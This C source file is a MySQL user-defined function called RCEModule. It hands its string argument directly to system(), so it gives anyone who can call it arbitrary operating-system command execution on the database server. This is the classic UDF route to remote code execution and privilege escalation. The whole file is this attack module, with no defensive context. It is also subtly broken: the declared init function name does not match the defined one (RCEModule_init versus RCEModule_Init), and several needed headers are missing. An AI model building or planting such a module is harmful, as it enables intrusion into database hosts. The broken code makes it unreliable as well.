#include <my_global.h>
#include <mysql.h>


my_bool RCEModule_init(UDF_INIT *initid, UDF_ARGS *args, char *message);
void RCEModule_deinit(UDF_INIT *initid __attribute__((unused)));
char* RCEModule(UDF_INIT *initid, UDF_ARGS *args, char *result, unsigned long *length, char *is_null, char *error);

my_bool RCEModule_Init(UDF_INIT *initid, UDF_ARGS *args, char *message) {
    if(args -> arg_count < 1 || args -> arg_count > 1) {
        strcpy(message, "Invalid argument count.Should be 1 arg.");
        return 1;
    }

    args -> arg_type[0]=STRING_RESULT;
    initid -> ptr = (char*) malloc(200);
    return 0;
}

void RCEModule_deinit(UDF_INIT *initid __attribute__((unused))) {
    if (initid -> ptr) {
        free (initid -> ptr);
    }
}

char* RCEModule(UDF_INIT *initid, UDF_ARGS *args, char *result, unsigned long *length, char *is_null, char *error) {

    system(args -> args[0]);
    return "";
}